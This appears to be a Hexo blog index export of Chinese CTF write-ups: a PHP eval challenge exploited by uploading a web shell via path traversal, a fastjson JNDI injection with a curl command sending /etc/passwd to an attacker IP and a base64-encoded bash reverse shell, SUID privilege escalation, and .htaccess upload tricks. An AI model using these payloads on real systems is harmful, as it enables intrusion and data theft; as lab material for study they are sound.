class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">init</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sesspath</span> = <span class="string">&quot;/tmp/session&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_save_path</span>(<span class="variable">$sesspath</span>);   <span class="comment">//session存放地址</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>] = <span class="string">&#x27;ck&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="string">&quot;/tmp/resource&quot;</span>))</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;/tmp/resource&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_dir_exists</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">dir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$dir</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">read</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_file</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getres</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">log_write</span>(<span class="variable">$input</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/tmp/resource/&quot;</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请先上传词库文件。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ck</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>),<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ck</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$key</span>,<span class="variable">$input</span>) <span class="keyword">or</span> <span class="title function_ invoke__">strstr</span>(<span class="variable">$input</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="variable">$type</span> = <span class="title function_ invoke__">key</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$v</span> = <span class="variable">$value</span>[<span class="variable">$type</span>];</span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$type</span>)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;string&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$v</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;image&quot;</span>:</span><br><span class="line">                    <span class="variable">$b64img</span> = <span class="string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$v</span>)) . <span class="string">&#x27;&quot;/&gt;&#x27;</span>;      <span class="comment">//文件获取，然后以base64形式返回给客户端</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$b64img</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;calc&quot;</span>:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>])&#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\(|\)|\&#x27;|\&quot;/im&quot;</span>,<span class="variable">$v</span>))&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;包含非法字符&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v</span>;&quot;</span>);      <span class="comment">//这个应该是利用点，执行任意命令，但是需要$_SESSION[&#x27;is_admin&#x27;]存在</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;admin才能使用这个功能&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;这个动作暂时还没能实现&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;没有匹配到词库消息&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uploadc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uploadc&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cname&#x27;</span>];</span><br><span class="line">    <span class="variable">$resourcedir</span> = <span class="string">&quot;/tmp/resource/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="variable">$resourcedir</span>))      <span class="comment">//规则存放地址</span></span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$resourcedir</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;&lt;&quot;</span>))&#123;  <span class="comment">//关键词过滤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;别这样！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>))&#123;      <span class="comment">//关键词过滤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;别这样！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>] = <span class="variable">$filename</span>;     <span class="comment">//对$_SESSION[&#x27;cname&#x27;]进行更新</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$resourcedir</span>.<span class="variable">$filename</span>,<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;上传成功&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log_write</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$logpath</span> = <span class="string">&quot;log.txt&quot;</span>;</span><br><span class="line">    <span class="variable">$oper</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">    <span class="variable">$opername</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$oper</span>,<span class="number">0</span>,<span class="number">1</span>) ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> &lt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$oper</span>);<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$opername</span> .= <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$logpath</span>,<span class="string">&quot;<span class="subst">$opername</span> : <span class="subst">$msg</span> \n&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getres</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>]);   <span class="comment">//根据输入的input进行相应的操作</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uploadc&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">uploadc</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;clear&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;log.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以根据uploadc()获取规则的存放地址</p><p>尝试读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;你好&quot;</span>: &#123;<span class="string">&quot;string&quot;</span>: <span class="string">&quot;你好ctfer！&quot;</span>&#125;, <span class="string">&quot;1&quot;</span>: &#123;<span class="string">&quot;image&quot;</span>: <span class="string">&quot;/tmp/resource/ck&quot;</span>&#125;, <span class="string">&quot;2&quot;</span>:&#123;<span class="string">&quot;calc&quot;</span>:<span class="string">&quot;1+1&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142134509.png" alt="image-20220714200142039"></p><h3 id="写木马"><a href="#写木马" class="headerlink" title="写木马"></a>写木马</h3><p>通过uploadc()函数写木马</p><p>尽管使用了strpos进行过滤，但是将<code>&lt;</code>和<code>.</code>放在字符串首位就可以使得判别结果为0，从而进行绕过</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142135740.png" alt="image-20220714211740154"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploadc=%<span class="number">3</span>C%<span class="number">3</span>Fphp+%<span class="number">40</span><span class="keyword">eval</span>(%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E&amp;cname=../.../../../../<span class="keyword">var</span>/www/html/xx.php</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142135366.png" alt="image-20220714213106213"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ciscn2022 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯2022_Web_网站取证</title>
      <link href="/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/"/>
      <url>/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝帽杯——Web-amp-网站取证"><a href="#蓝帽杯——Web-amp-网站取证" class="headerlink" title="蓝帽杯——Web&amp;网站取证"></a>蓝帽杯——Web&amp;网站取证</h1><h2 id="Ez-gadget"><a href="#Ez-gadget" class="headerlink" title="Ez_gadget"></a>Ez_gadget</h2><p>&#x2F;json路由下，有个这样的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str != <span class="literal">null</span> &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) </span><br></pre></td></tr></table></figure><p>这个牵扯到hashcode相同，但是字符串不一样，和md5弱碰撞有点像</p><p>找到这个博客：<a href="https://blog.csdn.net/weixin_44245828/article/details/109853439">https://blog.csdn.net/weixin_44245828/article/details/109853439</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301787.png" alt="img"></p><p>根据博客内容将key:BHUCCIx2zF9mMpJ7进行调整，调整为BHUBbIx2zF9mMpJ7</p><p>一个值的ascii差了1，然后紧跟着就整一个ascii大31字母的进行<code>补偿</code>，其余不变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;curl http://ip:7010 -Fe=@/etc/passwd&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301244.png" alt="img"></p><p>发包，注意用unicode编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=xH8b2iQfPbGejJgs&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://ip:1099/cw3nmu&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>尝试外带文件，测试&#x2F;etc&#x2F;passwd</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0063\u0077\u0033\u006e\u006d\u0075&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301428.png" alt="img"></p><p>反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzExNi42Mi4yNDAuMTQ4LzcwMTAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301502.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0061\u006f\u006a\u0035\u0072\u0068&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>监听7010端口，反弹shell</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301250.png" alt="img"></p><p>但是权限有问题，根目录下没有flag文件，想到之前的一个提权学习</p><p><a href="https://www.it-sec.fail/jerseyctf-2022-mist-root-me/">JerseyCTF 2022 &#x2F; mist – root-me – it-sec.fail</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301512.png" alt="img"></p><p>模仿打一遍就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">date</span> -f /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301557.png" alt="img"></p><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>顺带写一下部分网站取证部分</p><h3 id="网站取证1"><a href="#网站取证1" class="headerlink" title="网站取证1"></a>网站取证1</h3><p>vscode搜索_POST，发现一句话木马</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122303763.png" alt="img"></p><p>lanmaobei666</p><h3 id="网站取证2"><a href="#网站取证2" class="headerlink" title="网站取证2"></a>网站取证2</h3><p>加密解密处理时 mcrypt_module_open()函数在7.1中被贬低，将在7.2中被移除，要用openssl_decrypt()函数代替。换用php5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br><span class="line"><span class="comment">//KBLT123</span></span><br></pre></td></tr></table></figure><p>KBLT123</p><h3 id="网站取证3"><a href="#网站取证3" class="headerlink" title="网站取证3"></a>网站取证3</h3><p>找到加密函数，有个<code>$key</code>，就是salt值</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305575.png" alt="img"></p><p>jyzg123456</p><h3 id="网站取证4"><a href="#网站取证4" class="headerlink" title="网站取证4"></a>网站取证4</h3><p>数据库中的money是加密的，不能直接进行加减，找到解密函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305749.png" alt="img"></p><p>bak.sql数据库中保存有汇率信息</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305792.png" alt="image-20220712230533295"></p><p>转账部分，转账的金额需要用上面的解密函数进行解密，编号2，3，4，5是对应的人员，这一点对应一下即可</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122306697.png" alt="image-20220712230614304"></p><p>根据这些内容，写脚本算出最终的转账数目即可</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝帽杯 </tag>
            
            <tag> 2022 </tag>
            
            <tag> fastjson </tag>
            
            <tag> 网站取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2022华中赛区web部分wp</title>
      <link href="/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn2022华中分区web部分wp"><a href="#ciscn2022华中分区web部分wp" class="headerlink" title="ciscn2022华中分区web部分wp"></a>ciscn2022华中分区web部分wp</h1><p>[toc]</p><h2 id="FakeUpload1"><a href="#FakeUpload1" class="headerlink" title="FakeUpload1"></a>FakeUpload1</h2><p>题目描述：嘶，长得好像上传呀。提交 flag 格式：flag{xxxx}。URL：http:&#x2F;&#x2F;该题目IP为Web赛题中【ctf赛题环境】的IP:58002</p><p>不是文件上传，是文件读取</p><p>当访问pics&#x2F;1.jpg的时候，url变为了<code>reader.php?filename=pics/1.jpg</code></p><p>所以直接修改报文，读取flag.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122140635.png" alt="image-20220712213531916"></p><h2 id="Identity23"><a href="#Identity23" class="headerlink" title="Identity23"></a>Identity23</h2><p>题目端口58003</p><p>disearch扫描</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150893.png" alt="image-20220712213222584"></p><p>传参，找到一个php  A0ther_hldden_PaGe.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150845.png" alt="img"></p><p>访问  A0ther_hldden_PaGe.php  可以上传文件，有一些防护</p><p>上传<code>.htaccess</code>文件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150456.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   </span><br></pre></td></tr></table></figure><p>然后上传，注意修改报文</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150923.png" alt="img"></p><p>传一个图片马1.jpg</p><p>然后蚁剑连接  因为1.jpg是之前上传的图片马，现在被当作php解析了</p><p>蚁剑连接  查看该文件即可</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150519.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn2022 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/11/hello-world/"/>
      <url>/2022/07/11/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
